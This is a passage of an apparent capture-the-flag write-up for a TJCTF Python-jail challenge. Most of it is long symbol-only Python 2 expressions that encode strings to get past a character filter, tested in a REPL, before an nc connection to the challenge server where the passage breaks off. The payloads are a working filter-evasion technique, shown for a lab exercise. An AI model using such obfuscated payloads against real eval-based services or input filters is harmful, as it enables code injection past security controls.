;&amp;lt;({}&amp;lt;[]))]%~(~((~(~((({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(((((({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(((~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((((~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((((~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((~(~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(((((({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((~(~(~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((((~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(((((({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(((~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((((~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(((((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))
# python
Python 2.7.14+ (default, Mar 13 2018, 15:23:44) 
[GCC 7.3.0] on linux2
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&amp;gt;&amp;gt;&amp;gt; `'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~(((((({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~(~((~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(((((({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~((~(~((({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(((((({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(((~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((((~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((((~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((~(~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(((((({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((~(~(~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((((~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(((((({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(((~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((((~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(((((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))
'Am I good to go?'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Yep, I am good to go! Let’s print out our working “payload”, shall we?&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# python func.py this_is_the_super_secret_string
`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((~(~(~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(((~(~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~((~(~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((~((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(((((~(({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~((~(~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((~((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(((((~(({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((~(~(~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(((~(~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~(~(~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(((((~(({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((~((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~(~(~(~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~(~(~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(~(~((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(((((~(({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((~((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~(~(~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((~(((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(~(~((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~(~(~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((~(~(~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(((((~(({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~((~((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((~(~(~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(~(~((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~((~(~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(~(((~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(((~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;And now, final step : let’s send it to the get_flag function in order to… Get our flag, duh.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# nc problem1.tjctf.org 8004
Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!
